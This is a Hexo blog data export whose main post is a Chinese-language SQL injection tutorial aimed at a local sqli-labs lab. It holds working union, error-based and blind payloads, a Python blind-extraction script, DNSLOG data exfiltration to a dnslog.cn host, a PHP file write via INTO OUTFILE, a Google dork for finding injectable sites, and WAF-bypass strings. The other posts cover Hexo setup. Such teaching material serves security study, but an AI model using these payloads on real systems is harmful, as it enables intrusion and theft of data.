{"meta":{"title":"blog","subtitle":"","description":"this is my blog","author":"mujietongxue","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2024-07-23T14:52:02.699Z","updated":"2024-07-23T14:52:02.699Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"所有分类","date":"2024-07-23T14:52:02.699Z","updated":"2024-07-23T14:52:02.699Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2024-07-23T14:52:02.700Z","updated":"2024-07-23T14:52:02.700Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有标签","date":"2024-07-23T14:52:02.700Z","updated":"2024-07-23T14:52:02.700Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"SQL注入总结","slug":"SQL注入总结","date":"2024-07-25T03:06:12.000Z","updated":"2024-07-26T10:31:17.809Z","comments":true,"path":"2024/07/25/SQL注入总结/","permalink":"http://example.com/2024/07/25/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"","text":"一、sql注入概述SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询。 二、寻找sql注入通过Google语法寻找存在SQL注入的网站如： 1inurl: php?id= 测试注入点 1234URL参数：攻击者可以在应用程序的 URL 参数中注入恶意 SQL 代码，例如在查询字符串或路径中。表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标。Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，攻击者可以通过修改 Cookie 中的值来进行 SQL 注入。HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，攻击者可以在 HTTP 头部中注入恶意 SQL 代码。 判断是否存在注入，注入是字符型还是数字型 数字型：select * from table where id =$id字符型：select * from table where id=&#39;$id&#39; 判断数字型： 1231 and 1=1 #永真式 select * from table where id=1 and 1=11 and 1=2 #永假式 select * from table where id=1 and 1=2#若永假式运行错误，则说明此SQL注入为数字型注入 判断字符型： 1231&#x27; and &#x27;1&#x27;=&#x27;11&#x27; and &#x27;1&#x27;=&#x27;2#若永假式运行错误，则说明此SQL注入为字符型注入 三、union联合注入在我们判断了注入类型后接下来进入正题 第一步查字段数使用order by查询字段个数如图： 注释:--+：本质上是--空格，+会被浏览器解释为空格，也可以使用 URL 编码形式--%20 使用order by 数字来查询字段的个数，这里的关键是找到临界值，例如order by 4时候还在报错，但是order by 3时没有出现报错，3 就是这里的临界值，说明这里存在 3 个字段。 第二步查找显示位使用union select查找显示位，上一步我们已经知道了字段的具体个数，现在我们要判断这些字段的哪几个会在前端显示出来，这些显示出来的字段叫做显示位，我们使用union select 1,2,3.....(字段个数是多少个就写到几)来对位置的顺序进行判断（其中数字代表是几号显示位）。 这里将1改为-1是为了使前面id查询为空，让union语句查询结果显示在页面上。(不知道union语句用法的同学可在MySQL上练习再尝试) 第二步爆库名使用database()函数爆出库名，database()函数主要是返回当前（默认）数据库的名称。 第三步爆表名基于库名使用table_name爆出表名，先来介绍一下使用到的函数和数据源： group_concat()函数：使数据在一列中输出 information_schema.tables数据源：存储了数据表的元数据信息，我们主要使用此项数据源中的table_name和table_schema字段 information_schema数据库包含了所有的数据库名，表名，列名。 1http://127.0.0.1/sqli/Less-1/?id=-1&#x27;union select 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),3 --+ 第四步爆列名基于表名使用column_name爆出列名，此时数据源为information_schema.columns，位置在table_name=&#39;表名&#39;(记得给表名加单引号)。 1http://127.0.0.1/sqli/Less-1/?id=-1&#x27;union select 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),3 --+ 第五步爆信息使用列名爆敏感信息，直接 from 表名即可，这里需要使用group_concat(concat_ws())实现数据的完整读取，group_concat()函数在前面几步就接触过，主要是使数据在一列中输出 这就带来了一个问题，如果直接把列放入group_concat()函数，列间的界限就不清晰了，concat_ws()就是为了区分列的界限所使用的，其语法如下： 1concat_ws(&#x27;字符&#x27;,字段1,字段2,.....) 1http://127.0.0.1/sqli/Less-1/?id=-1&#x27;union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,id,username,password)) from users --+ 这样我们就完成了一次完整的SQL注入。 四、报错注入报错注入的本质是使用一些指定的函数制造报错，从而从报错信息获得我们想要的内容，使用前提是后台没有屏蔽数据库的报错信息，且报错信息会返回到前端，报错注入一般在无法确定显示位的时候使用。 123456789101112131415161718191.floor() 如：select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);2.extractvalue() 如：select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml() 如：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection() 如：select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint() 如：select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon() 如：select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon() 如：select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring() 如：select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring() 如：select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp() 如：select * from test where id=1 and exp(~(select * from(select user())a)); updatexml()updatexml()函数本身是改变 XML 文档中符合条件的值，其语法如下： 1updatexml(XML_document,XPath_string,new_value) 语法中使用到以下三个参数 XML_document：XML 文档名称，使用 String 格式作为参数。 XPath_string：路径，XPath 格式，updatexml()函数如果这项参数错误便会导致报错，我们主要利用的也是这个参数。 new_value：替换后的值，使用 String 格式作为参数。 1http://127.0.0.1/sqli/Less-5/?id=1&#x27;and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1))-- - floor()floor()报错注入是利用下方这个相对固定的语句格式，导致的数据库报错(其中各函数的用法可在MySQL中练习) 1select count(*),(floor(rand(0)*2)) x from users group by x 浅析floor语句报错原理： 我们先来分析(floor(rand(0)*2))在 SQL 语句中的含义，我们先来看它的内层rand(0)*2，以 0 为种子使用send()函数生成随机数序列，并且将数列中的每一项结果乘以 2。 再将乘以 2 后的结果放入floor()函数取整，最后得出伪随机数列如下，因为使用了固定的随机数种子0，他每次产生的随机数列的前六位都是相同的0 1 1 0 1 1的顺序。 当group by语句与rand()函数一起使用时，Mysql 会建立一张临时表，这张临时表有两个字段，一个是主键，一个是count(*)，此时临时表无任何值，Mysql 先计算group by后面的值，也就是floor()函数（它们之间是以x作为媒介传递的），如果此时临时表中没有该主键，则在插入前rand()函数会再计算一次。 上面提到固定序列的第一个值为 0，Mysql 查询临时表，发现没有主键为 0 的记录，因此将此数据插入，这时因为临时表中没有该主键，Mysql 插入的过程中还会计算一次group by后面的值，也就是floor()函数，但是此时floor()函数的结果为固定序列的第二个值，因此插入的主键为1，count(*)也为1。 简而言之 Mysql 的动作有两步，第一步是判断是否存在，第二步是插入数据，每步都需要rand()函数计算一次，并最终通过floor()函数输出结果（这种情况只在主键不存在时发生）。 主键 count(*) 1 1 紧接着 Mysql 会继续查询下一条数据，若发现重复的主键，则count(*)加 1，若没有找到主键，则添加新主键，此时遍历的是users表中的第二行，floor()函数的值是固定数列的第三项为 1，主键重复，count(*)加 1。 主键 count(*) 1 2 此时我们来到了报错的关键点，此时遍历users表中的第三行，floor()函数的值是固定数列的第四项为 0，此时不存在该主键，则需要进行刚才的两步走，做判断用的是固定数列的第四项为 0，插入时应用到固定数列的第五项为 1，此时 1 被当做一个新的主键插入到临时表中，则产生了主键重复错误。 固定序列 遍历行数 执行情况 0 第一行 判断是否有主键：0 1 第一行 计算并插入新主键：1 1 第二行 判断是否有主键：1 0 第三行 判断是否有主键：0 1 第三行 计算并插入新主键：1，报错 由上面的原理可见，利用floor(rand(0)*2)产生报错需要数据表里至少存在 3 条记录，我们可以再极限一点，使用floor(rand(14)*2)，即可在存在 2 条记录的时候使用了。 固定序列 遍历行数 执行情况 1 第一行 判断是否有主键：1 0 第一行 计算并插入新主键：0 1 第二行 判断是否有主键：1 0 第二行 计算并插入新主键：0，报错 1http://127.0.0.1/sqli/Less-5/?id=1&#x27;and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - exp()exp()即为以e为底的对数函数，exp中的函数成功执行后返回0，对0按位取反会返回一个无符号的BIGINT值，所以会造成Double型数据溢出错误从而报错，借此得到数据。 1select exp(~(select * FROM(SELECT USER())a)) 我们可用利用 Mysql Double 数值范围有限的特性构造报错，一旦结果超过范围，exp()函数就会报错，这个分界点就是 709，当exp()函数中的数字超过 709 时就会产生报错。 当 MySQL 版本大于 5.5.53 时，exp()函数报错无法返回查询结果，只会得到一个报错，所以在真实环境中使用它做注入局限性还是比较大的，但是可以用判断是否存在 SQL 注入。 五、盲注盲注就是在注入过程中，获取的数据不能回显至前端页面。此时我们需要利用一些方法进行判断或尝试，这个过程称为盲注。 函数 描述 left(字符串，截取长度) 从左边截取指定长度的字符串 length(字符串) 获取字符串的长度 ascii(字符串) 将指定字符串进行ascii编码 substr(字符串，start，截取长度) 截取字符串，可以指定起始位置和长度 mid(字符串，start，截取长度) 截取字符串，可以指定起始位置和长度 count() 计算总数，返回匹配条件的行数。 sleep(n) 将程序挂起n秒 if(参数1，参数2，参数3) 参数1为条件，当参数1返回的结果为true时，执行参数2，否则执行参数3 布尔盲注布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断。 1http://127.0.0.1/sqli/Less-5/?id=1&#x27;and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=114-- - 1GET /sqli/Less-5/?id=1%27and%20ascii(substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),&#123;&#123;int(1-20)&#125;&#125;,1))=&#123;&#123;int(32-128)&#125;&#125;--%20- HTTP/1.1 时间盲注时间盲注可以用在比布尔盲注过滤还要严格的环境中，当页面连真和假这个判断条件都不提供时，我们便可以让我们自己创造时间这一条件，当语句被执行时，便会产生延迟，反之则不会。 12?id=1&#x27; and sleep(5) --+ //满足闭合条件，页面延迟回显?id=1&#x27; and sleep(5) //不满足闭合条件，页面直接回显 1http://127.0.0.1/sqli/Less-5/?id=1&#x27;and if((ascii(substr(database(),1,1))=114),sleep(5),1)-- - 1GET /sqli/Less-5/?id=1%27and%20if((ascii(substr(database(),&#123;&#123;int(1-10)&#125;&#125;,1))=&#123;&#123;int(32-128)&#125;&#125;),sleep(5),1)--%20- HTTP/1.1 python脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsimport timesession = requests.Session()url = &quot;http://127.0.0.1/sqli/Less-11/&quot;def GET_db(): name = &#x27;&#x27; for i in range(1,50): begin = 32 end = 128 tmp = (begin + end) // 2 while begin &lt; end: paramsPost = &quot;and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;-- -&quot; .format(i,tmp) response = session.get(url+paramsPost) if &#x27;You are in...........&#x27; in response.text: begin = tmp + 1 tmp = (begin + end) // 2 else: end = tmp tmp = (begin + end) // 2 if(tmp==32): break name += chr(tmp) print(name)def POST_db(): name = &#x27;&#x27; for i in range(1,10): begin = 32 end = 128 mid = (begin + end) // 2 while begin &lt; end: start_time = time.time() headers = &#123; &#x27;User-Agent&#x27;: &#x27;My User Agent 1.0&#x27;, &#125; data = &#123; &quot;uname&quot;: f&quot;admin&#x27;/**/and/**/if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)-- -&quot;, &quot;passwd&quot;: &quot;123&quot;, &quot;submit&quot;: &quot;Submit&quot; &#125; session.post(url, data=data, headers=headers) end_time = time.time() if end_time - start_time &gt; 1: begin = mid+1 mid = (begin + end) // 2 else: end = mid mid = (begin + end) // 2 if(mid==32): break name += chr(mid) print(name)POST_db()#GET_db() 六、堆叠注入顾名思义,堆叠注入就是将一堆 sql 语句叠加在一起执行,使用分号结束上一个语句再叠加其他语句一起执行。 1SELECT * FROM users; DROP TABLE users; 在这个例子中，两个查询被堆叠在一起，前一个查询从 users 表中选择所有数据，而后一个查询删除 users 表。如果应用程序未能正确处理输入，攻击者可以通过这种方式执行多个查询。 七、基于 DNSLOG 的注入DNSLOG 是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。像是 SQL 盲注、命令执行、SSRF 及 XSS 等攻击但无法看到回显结果时，就会用到 DNSLOG 技术，相比布尔盲注和时间盲注，DNSLOG 减少了发送的请求数，可以直接回显，也就降低了被安全设备拦截的可能性。 123456dns带外查询属于MySQL注入，在MySQL中有个系统属性： secure_file_priv特性，有三种状态 secure_file_priv为null 表示不允许导入导出 secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹 secure_file_priv没有设置时，则表示没有任何限制show variables like &#x27;%secure%&#x27;;查看load_file()可以读取的磁盘。有路径或为null的则不可以进行DNSlog外带 DNSLOG 注入优点众多，但利用条件也较为严苛 只支持 Windows 系统的服务端，因为要使用 UNC 路径这一特性，Linux 不具备此特性 Mysql 支持使用load_file()函数读取任意盘的文件 UNC 全称 Universal Naming Convention，译为通用命名规范，例如我们在使用虚拟机的共享文件功能时，便会使用到 UNC 这一特性 UNC 路径的格式如下： 1\\\\192.168.0.1\\test\\ load_file()dnslog 1http://127.0.0.1/sqli/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\\\\\&quot;,(select group_concat(table_name SEPARATOR&#x27;-&#x27;) from information_schema.tables where table_schema=&#x27;security&#x27;),&quot;.gzu0cd.dnslog.cn\\\\robots.txt&quot;)) -- - dns解析记录类型12345678910111213141516171819202122232425262728293031323334353637383940414243 1.A记录A记录是最常见和最常用的一种记录类型，用于指定主机名和IP（IPv4）地址之间的关系。通过添加A记录，网站管理者可以将域名与网站服务器地址进行绑定。2.AAAA记录与A记录相对的是，AAAA记录是用于将域名解析到IPv6地址的一种DNS记录类型。国内很多解析服务器不支持AAAA记录的设置，如果想进行AAAA记录解析，就需要将域名的NS记录指向一些专业的域名解析厂商。3.CNAME记录CNAME记录也是比较常用的一种记录类型，它是主机名到主机名的映射。如果需要将域名指向另一个域名，而不是一个IP地址，那么就需要添加一条CNAME记录。在CDN、企业邮箱、全局流量管理等业务场景下，经常会使用到CNAME记录。4.NS记录NS记录用于将子域名交给其他DNS服务商解析时使用，从某种意义上来讲NS记录相当于设置子域名解析服务器的A记录，用于在解析请求时确定该服务器的IP地址。大多数域名注册商默认使用自己的NS记录来解析用户的域名，但用户也可以设置NS记录指向更专业安全的域名解析厂商。5.MX记录MX记录是邮件交换记录，主要用于邮箱解析，在发送邮件时根据收件人的地址后缀进行邮件服务器的定位。MX记录的权重对邮件服务非常重要，发送邮件时，会先对域名进行解析，查找MX记录，按照权重从小到大的顺序联通服务器进行邮件发送。6.TXT记录TXT记录，一般用于某个主机名的标识和说明，通过设置TXT记录可以使别人更方便地联系到你。此外TXT记录还常用于做SPF反垃圾邮件和SSL证书的DNS验证等。7.PTR记录PTR记录可以简单理解为A记录的反向记录，用于将一个IP地址指向对应的主机名，实现通过IP地址访问域名。8.SOA记录SOA记录又叫起始授权机构记录，NS标记多台解析服务器，SOA记录用于表明在众多NS记录中哪一台才是主服务器。当要查询的域名在所有递归解析服务器中没要域名解析的缓存时，就会回源来请求此域名的SOA记录，获取提供权威解析服务的地址。9.SRV记录SRV记录即服务定位（SRV）资源记录，用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port number）等。10.URL转发URL转发，是将当前访问的域名指向另一个网络地址，可以分为显性转发和隐性转发两种。显性URL：将域名指向另一个网络地址时，访问域名自动跳转至目标网址，地址栏显示为目标网站地址。隐性URL：访问域名跳转到目标网站，但地址栏显示为原网站地址。 八、outfile1http://127.0.0.1/sqli/Less-1/?id=0&#x27;union select 1,&quot;&lt;?php phpinfo(); ?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\sqli\\\\1.php&quot;-- - 九、二次注入在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。 没有对username进行转义， 只修改password存在二次注入漏洞。 十、宽字节当某字符的大小为一个字节时，称其字符为窄字节，当某字符的大小为两个或更多字节时，称其字符为宽字节，而且不同的字符编码方式和字符集对字符的大小有不同的影响。 为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\\”进行转义。 addslashes()函数：返回在预定义字符之前添加反斜杠的字符串 magic_quotes_gpc选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL等字符前加入转义字符\\，在高版本 PHP 中（&gt;&#x3D;5.4.0）已经弃用 mysql_real_escape_string()函数：函数转义 SQL 语句中使用的字符串中的特殊字符 mysql_escape_string()函数：和mysql_real_escape_string()函数基本一致，差别在于不接受连接参数，也不管当前字符集设定 宽字节注入的本质是开发者设置数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入。 反斜杠用 URL 编码表示是%5c，所以如果我们输入单引号’，它会变成%5c%27，这样我们就无法闭合 SQL 语句了。 但是，如果我们输入%df’，它会变成%df%5c%27，这里，%df%5c是一个宽字节的GBK编码，它表示一个繁体字“運”。 十一、绕过1. and&#x2F;or 被过滤&#x2F;拦截（1）双写anandd、oorr （2）使用运算符代替&amp;&amp;、|| （3）直接拼接&#x3D;号，如：?id&#x3D;1&#x3D;(condition) （4）其他方法，如：?id&#x3D;1^(condition) 2. 空格被过滤&#x2F;拦截（1）注释绕过空格 示例：select/**/user()/**/from/**/dual （2）括号绕过空格 示例：select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());#（3）Tab 代替空格 （4）使用两个空格 （5）使⽤其他不可⻅字符代替空格 如 %09, %0a, %0b, %0c, %0d, %a0 3. 逗号被过滤&#x2F;拦截（1）改用盲注 （2）使用 join 语句代替 示例：union select * from ((select 1)A join (select 2)B join (select 3)C）; （3）使用 substring 函数 1substring(str FROM pos) 4. 单双引号被过滤&#x2F;拦截&#x2F;转义（1）需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入(宽字节注入等) （2）不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。 5. 比较符号（&#x3D; &lt; &gt;）被过滤&#x2F;拦截（1）使用 in() 绕过 示例：?id=&#39; or substr((select database()),1,1) in(&#39;s&#39;) （2）greatest，strcmp 等函数进行绕过 示例：select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 1select strcmp(left(database(),1),0x32);#lpad(&#x27;asd&#x27;,2,0) 6.绕过注释符(1)（#，–(后面跟一个空格））过滤： id&#x3D;1’ union select 1,2,3||’1 (2)最后的or ‘1闭合查询语句的最后的单引号，或者： id&#x3D;1’ union select 1,2,’3 7.绕过union，select，where等（1）使用注释符绕过： 常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a 用法：U&#x2F;&#x2F; NION &#x2F;&#x2F; SE&#x2F;&#x2F; LECT &#x2F;&#x2F;user，pwd from user （2）使用大小写绕过： id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT （3）内联注释绕过： id&#x3D;-1’&#x2F;!UnIoN&#x2F; SeLeCT 1,2,concat(&#x2F;!table_name&#x2F;) FrOM &#x2F;information_schema&#x2F;.tables &#x2F;!WHERE *&#x2F;&#x2F;*!TaBlE_ScHeMa&#x2F; like database()# （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）： id&#x3D;-1’UNIunionONSeLselectECT1,2,3–- 8.等价函数绕过123456hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir() 举例：substring()和substr()无法使用时： 1?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者： 1234substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 十二、waf绕过1.常见的一种waf1?id=0+union+select+concat_ws(0x7e,(select+schema_name+from+information_schema.SCHEMATA+limit+1+offset+0),(select+schema_name+from+information_schema.SCHEMATA+limit+1+offset+1)) 1?id=0+union+select+json_arrayagg(schema_name)+from+information_schema.SCHEMATA 屏蔽空格和group_concat用+和json_arrayagg替换。 2.安全狗12345/*//*//*//*//*%0axxxx*//*!11440xxxx*//*!/*//*/*/from/*!--+/*%0ainformation_schema./*!schemata*/-- - /*!*/, /*!11440xxxx*/: 这是MySQL的注释语法，用来在SQL语句中插入注释。攻击者可以利用这些注释绕过简单的正则表达式检测。 /*!%0a*//*, /*%0axxxx*/: 其中%0a是URL编码中的换行符，常用于混淆SQL查询，绕过防火墙的检查。 from/*!+%0ainformation_schema./*!schemata*/--: 这是一种典型的获取数据库schema信息的攻击手法，使用MySQL注释和URL编码来混淆语句。 十三、脏数据 切片例如注入语句为id&#x3D;1 and 1&#x3D;1，将请求修改为分块传输的方式 传入一段长数据使waf失效，某些waf处理POST的数据时，只会检测开头的8K，后面选择全部放过。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"blog搭建","slug":"bolg的搭建","date":"2024-07-11T03:06:12.000Z","updated":"2024-07-25T03:13:36.863Z","comments":true,"path":"2024/07/11/bolg的搭建/","permalink":"http://example.com/2024/07/11/bolg%E7%9A%84%E6%90%AD%E5%BB%BA/","excerpt":"","text":"0x000.下载软件Node.js — Run JavaScript EverywhereGit - Downloads 0x001.操作步骤在博客目录下右键选中git bash here打开bash窗口使用npm 安装hexo 1234npm install -g hexo-cli //安装hexohexo init blog //初始化一个名为blog的项目cd blog //进入bloghexo g //编译构建 测试博客新建博客文章 1234hexo new test_my_site //博客新建一个文章hexo g //构建hexo s //启动服务之后就可以访问127.0.0.1:4000访问blog了 配置ssh 1ssh-keygen -t rsa -C &quot;邮件地址&quot; 将id_rsa中的内容写入GitHub的SSH key测试能否链接上GitHub 1ssh -T git@github.com # 注意邮箱地址不用改 123npm install hexo-deployer-git --savegit config --global user.name &quot;xxx&quot;// 你的github用户名，非昵称git config --global user.email &quot;xxx@qq.com&quot;// 填写你的github注册邮箱 在github上新建一个存储库，命名为github的用户名.github.io编辑_config.yml文件，在最后改成这样 1234deploy: type: git repository: git@github.com:xxx/xxx.github.io.git branch: main 上传成功后登录xxx.github.io 1hexo d 0x002.hexo介绍12345678910111213141516hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令hexo version #查看Hexo的版本hexo generate #生成静态页面至public目录hexo s -g #生成并本地预览hexo d -g #生成并上传 123456789+-- .deploy #hexo deploy生成的文件+-- node_modules #npm组件+-- public #生成的静态网页文件+--scaffolds #模板+-- source #博客正文和其他源文件| +-- _posts #我们自己写的文章以md结尾+-- themes #主题+-- _config.yml #全局配置文件-- package.json #定义了hexo所需要的各种模块","categories":[{"name":"blog","slug":"blog","permalink":"http://example.com/categories/blog/"}],"tags":[{"name":"blog","slug":"blog","permalink":"http://example.com/tags/blog/"}]},{"title":"test_my_site","slug":"test-my-site","date":"2024-07-10T06:46:52.000Z","updated":"2024-07-23T14:52:02.699Z","comments":true,"path":"2024/07/10/test-my-site/","permalink":"http://example.com/2024/07/10/test-my-site/","excerpt":"","text":"hello world！ 1 21qqqq 12345111&lt;?phpecho &quot;Hello, World!&quot;;?&gt;","categories":[{"name":"test","slug":"test","permalink":"http://example.com/categories/test/"}],"tags":[{"name":"test","slug":"test","permalink":"http://example.com/tags/test/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-07-10T06:41:03.834Z","updated":"2024-07-23T14:52:02.698Z","comments":true,"path":"2024/07/10/hello-world/","permalink":"http://example.com/2024/07/10/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"blog","slug":"blog","permalink":"http://example.com/categories/blog/"},{"name":"test","slug":"test","permalink":"http://example.com/categories/test/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"blog","slug":"blog","permalink":"http://example.com/tags/blog/"},{"name":"test","slug":"test","permalink":"http://example.com/tags/test/"}]}